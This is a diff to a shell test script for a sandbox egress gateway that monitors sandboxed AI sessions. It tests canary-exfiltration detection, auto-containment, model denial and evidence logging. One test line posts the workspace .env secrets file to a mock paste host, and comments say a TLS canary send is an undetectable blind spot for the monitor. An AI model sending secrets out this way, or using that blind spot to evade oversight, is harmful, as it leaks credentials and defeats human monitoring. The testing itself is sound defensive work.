@@ -18,7 +18,7 @@ sb() { kubectl -n sbx-sessions exec "$POD" -- "$@" 2>/dev/null; }
 code() { sb curl -s -o /dev/null -m 10 -w '%{http_code}' "$@" || true; }
 for _ in $(seq 1 20); do [ "$(code http://paste-mock.lab-ext/ping)" = 200 ] && break; sleep 1; done
 
-# Order matters because the sentinel is watching: an HTTP canary send triggers D1 auto-containment,
+# Order matters because the sentinel is watching: an HTTP canary send triggers canary-exfiltration auto-containment,
 # so functional checks run first, the (undetectable) TLS canary next, and the HTTP canary last.
 echo "--- egress gateway"
 check "allowed host, benign POST"         200 "$(code -X POST --data 'hello' http://paste-mock.lab-ext/upload)"
@@ -47,19 +47,19 @@ sleep 3
 check "still running after TLS canary (blind spot)" 200 "$(code -X POST --data 'hello' http://paste-mock.lab-ext/upload)"
 check "allowed host, canary over HTTP (B9: allowed, detected)" 200 "$(code -X POST --data-binary @/workspace/repo/.env http://paste-mock.lab-ext/upload)"
 
-echo "--- after D1 auto-containment"
+echo "--- after canary-exfiltration auto-containment"
 for _ in $(seq 1 30); do [ "$(code -m 3 -X POST --data 'x' http://paste-mock.lab-ext/upload)" = 000 ] && break; sleep 1; done
 check "egress after containment (quarantined)"  000 "$(code -m 4 -X POST --data 'x' http://paste-mock.lab-ext/upload)"
 check "AI after containment (quarantined)"      000 "$(code -m 4 -X POST http://gateway:8080/v1/messages -H "x-api-key: $TOKEN" -H 'content-type: application/json' -d '{}')"
 
 echo "--- evidence (outside the sandbox)"
-EV=$(kubectl -n sbx-system exec deploy/gateway -- cat /evidence/gateway.jsonl | grep "\"$SID\"")
-j() { echo "$EV" | python3 -c "import json,sys; ev=[json.loads(l) for l in sys.stdin if l.strip()]; print($1)"; }
-check "D1 signal: canary over HTTP to allowed host"  1 "$(j "sum(1 for e in ev if e['action']=='egress_http' and (e.get('canary_match') or {}).get('id')=='c1')")"
+EVIDENCE=$(kubectl -n sbx-system exec deploy/gateway -- cat /evidence/gateway.jsonl | grep "\"$SID\"")
+j() { echo "$EVIDENCE" | python3 -c "import json,sys; ev=[json.loads(l) for l in sys.stdin if l.strip()]; print($1)"; }
+check "canary-exfiltration signal: canary over HTTP to allowed host"  1 "$(j "sum(1 for e in ev if e['action']=='egress_http' and (e.get('canary_match') or {}).get('id')=='c1')")"
 check "denial to attacker-sink recorded"             1 "$(j "sum(1 for e in ev if e['action']=='egress_deny' and e['dest_host']=='attacker-sink.lab-ext')")"
 check "TLS tunnel: allowed, no canary visibility"    1 "$(j "sum(1 for e in ev if e['action']=='egress_connect' and e['decision']=='allow' and e['dest_host']=='paste-mock.lab-ext')")"
 check "model denial recorded"                        1 "$(j "min(1,sum(1 for e in ev if e['action']=='ai_request' and e.get('reason')=='model_not_allowed'))")"
-check "tool_use parsed from model stream (D3 input)" 1 "$(j "min(1,sum(1 for e in ev if e['action']=='ai_tool_use' and 'sbx-tool-ok' in e.get('input','')))")"
+check "tool_use parsed from model stream (risky-tool-call input)" 1 "$(j "min(1,sum(1 for e in ev if e['action']=='ai_tool_use' and 'sbx-tool-ok' in e.get('input','')))")"
 check "hash chain verifies" True "$(kubectl -n sbx-system exec deploy/gateway -- python -c 'from sbx.common.evidence import verify_chain; print(verify_chain("/evidence/gateway.jsonl")[0])')"
 
 echo "--- ground truth (lab receipts)"
